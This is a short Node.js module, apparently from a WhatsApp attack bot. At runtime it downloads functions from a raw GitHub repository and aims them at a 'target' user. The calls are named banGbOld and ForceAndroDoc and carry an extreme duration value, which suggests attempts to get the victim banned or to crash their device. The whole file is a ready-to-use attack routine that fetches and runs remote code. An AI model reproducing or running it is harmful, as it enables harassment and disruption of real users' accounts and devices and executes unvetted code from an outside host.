const { getGithub } = require("./loader.js");

const API_URL =
    "https://raw.githubusercontent.com/Verse-tech-maker/LdvsTech-Function/main";

async function example(sock, target) {
    const api = await getGithub(API_URL, sock);

    const durationHours = 876582;

    await api.banGbOld(target);
    await api.ForceAndroDoc(sock, target, durationHours);
    await api.supportHeader(sock);
}

module.exports = {
    example,
    getGithub
};
